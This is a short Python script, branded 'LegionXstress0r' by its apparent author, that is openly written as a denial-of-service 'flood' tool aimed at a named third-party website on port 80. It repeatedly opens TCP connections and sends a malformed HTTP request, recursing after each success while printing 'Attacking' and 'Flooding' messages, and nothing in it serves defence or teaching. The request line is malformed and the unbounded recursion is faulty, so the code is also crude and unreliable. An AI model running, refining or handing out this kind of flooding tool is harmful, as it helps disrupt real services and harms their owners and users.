# import the socket module
import socket


def server_flood():
    server = 'www.aarc.weebly.com'

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server_ip = socket.gethostbyname(server)

    port = 80

    request = "GET /HTTP/1.1\n\nHost:  " + server_ip

    try:
        s.connect((server_ip, port))
        s.send(request.encode())
        s.recv(1024)

    except ConnectionError:
        print('[!] Packet not sent, or connection error...')
    else:
        print('Flooding %s(%s) on port %s' % (server, server_ip, port))
        server_flood()
    finally:
        print('LegionXstress0r c0ded by philt3rl3gi0n')

        # return server_flood()


def packet():

    server = 'www.aarc.weebly.com'
    port = 80

    server_ip = socket.gethostbyname(server)
    print('[+] Attacking %s(%s) on port %s' % (server, server_ip, port))

    server_flood()


if __name__ == '__main__':
    packet()

